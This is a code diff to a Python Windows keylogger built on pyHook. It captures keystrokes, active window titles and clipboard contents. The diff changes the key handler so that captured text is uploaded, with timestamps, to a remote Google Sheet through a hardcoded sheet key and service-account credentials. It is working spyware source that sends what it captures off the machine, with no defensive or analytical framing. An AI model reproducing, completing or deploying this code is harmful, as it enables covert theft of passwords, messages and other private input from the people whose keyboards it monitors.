@@ -1,27 +1,25 @@
 # -*- coding: utf-8 -*-
-
-try:
-    import pythoncom
-    import pyHook
-except:
-    print("Please Install pythoncom and pyHook modules")
-    exit(0)
+import pythoncom
+import pyHook
 import os
 import sys
 import win32event
 import win32api
 import winerror
 import argparse
-#import threading
 import time
+import gspread
+from oauth2client.service_account import ServiceAccountCredentials
 
-PATH_LOGS = "keylogs.txt"
-
+#Global variables
+PATH_LOGS = 'keylogs.txt'
+GSHEET_KEY = '15okwR0eO_WRlAtIc6HLRgjOQ8rpYerWwMg6-EyCIblI'
+CLIENT_CREDS = 'client_secret.json'
 
 def gsheetinit(key):
     # use creds to create a client to interact with the Google Drive API
     scope = ['https://spreadsheets.google.com/feeds']
-    creds = ServiceAccountCredentials.from_json_keyfile_name('client_secret.json', scope)
+    creds = ServiceAccountCredentials.from_json_keyfile_name(CLIENT_CREDS, scope)
     client = gspread.authorize(creds)
 
     # Find a workbook by name and open the first sheet
@@ -34,14 +32,12 @@ def gsheetinit(key):
     # print(list_of_hashes)
     return sheet
 
-
 # Disallowing Multiple Instance
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     print("Multiple Instance not Allowed")
     exit(0)
-
 
 class Keylogger():
 
@@ -100,20 +96,19 @@ class Keylogger():
         return True
 
     # Send logs to google form
-    def gsheet_logs(self):
-        if len(self.data) > 20:
-            print('sending to the cloud')
-            row = [self.context, self.data]
+    def gsheet_logs(self, data):
+        if len(data) > 20:
+            print('>Sending to the cloud<')
+            row = [self.context, time.ctime(), data]
             index = 1
-            sheet = gsheetinit("15okwR0eO_WRlAtIc6HLRgjOQ8rpYerWwMg6-EyCIblI")
+            sheet = gsheetinit(GSHEET_KEY)
             try:
                 sheet.insert_row(row, index)
                 self.data = ''
             except:
                 print('error fatal man')
-                pass
             self.data = ''
-        print('yes')
+            print('yes')
         return True
 
     def corresp(self, key):
@@ -312,7 +307,7 @@ class Keylogger():
         elif event.Key == 'Rmenu':  # alt gr
             self.alt = not self.alt
         elif event.Key == 'Back' or event.Key == 'Delete':  # del
-            self.data += '<del>'
+            self.data += '<Del>'
         else:
             if self.lastclipboard != self.clipboard:
                 self.lastclipboard = self.clipboard
@@ -328,7 +323,7 @@ class Keylogger():
                 self.context = event.WindowName
                 self.context_chg = 1
             print(self.data)  # debugging
-            self.local_logs()
+            self.gsheet_logs(self.data)
             self.context_chg = 0
         return True  # needs to return an integer value
 
